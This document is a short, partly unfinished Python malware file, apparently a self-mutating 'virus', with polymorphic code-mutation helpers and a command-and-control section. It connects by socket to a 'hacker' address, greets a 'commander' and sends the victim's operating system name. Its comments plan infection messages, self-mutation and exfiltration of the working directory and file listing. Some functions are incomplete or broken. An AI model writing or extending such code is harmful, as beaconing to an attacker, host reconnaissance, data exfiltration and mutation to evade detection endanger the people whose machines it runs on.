import socket
import sys
import time
import platform

# ----------- Variables -----------
host = '127.0.0.1' #Hacker's IP address as a string
port = 9999
target_os = platform.system()

# ----------- Functions ----------- 

# -- Self Mutation Functions -- 
#region
"""
function: mutate_instruction

Replaces certain operations with the equivalent ones. This can be arithmetic operations or
function calls.
"""
#TODO: Add in additional substitutions that are specific to the code.
def mutate_instruction(code):
    # Add in function calls
    substitutions = {
        "a + b": "a - (-b)",
        "a * 2": "a << 1",
        "a / 2": "a >> 1"
    }

    for original, substitute in substitutions.items():
        code = code.replace(original, substitute)

    return code

""" 
function: mutate_with_nop

Insert a "no-operation" equivalent statement in code. This is done using 
commands such as `pass` or unnecessary variable assignments. 
"""
#TODO: If working implement ways to prepend lines too.
#TODO: If prepend and append are working, integrate number number generator to prepend
# and append random amounts of lines.
def mutate_with_nop(code):
    lines = code.splitlines()
    mutated_lines = []

    for line in lines:
        mutated_lines.append(line)
        # Randomly insert a "NOP"
        mutated_lines.append("pass")

    return "\n".join(mutated_lines)

"""
function: swap_variables

This simulates register swapping in assembly for python by swapping around the names
of variables.
"""
#TODO: Change the substitutions to reflect the actual variables in the virus.
def swap_variables(code):
    substitutions = {
        "a": "temp1",
        "b": "temp2",
        "temp1": "a",
        "temp2": "b"
    }
#endregion

# -- Data Exfiltration --
#region

"""
function: send_data

A wrapper for socket.send() which encodes automatically in utf-8.

"""
def send_data(s, data):
    s.send(f"{data}".encode('utf-8'))

#endregion

# ----------- Main Operations ----------- 

# (1) Retrieve host OS information.


# (2) Establish connection with commander.
s = socket.socket()
s.connect((host, port))

s.send("Hello Command!\n".encode('utf-8'))

time.sleep(1)

send_data(s, f"Target OS: '{str(target_os)}'")

# (3) Send infection message.


# (4) Perform self mutations.


# (5) Data exfiltration.


# 5.1 For now exfiltrate the type of OS that the host is, the pwd, 
#      and the list of files in the current directory.

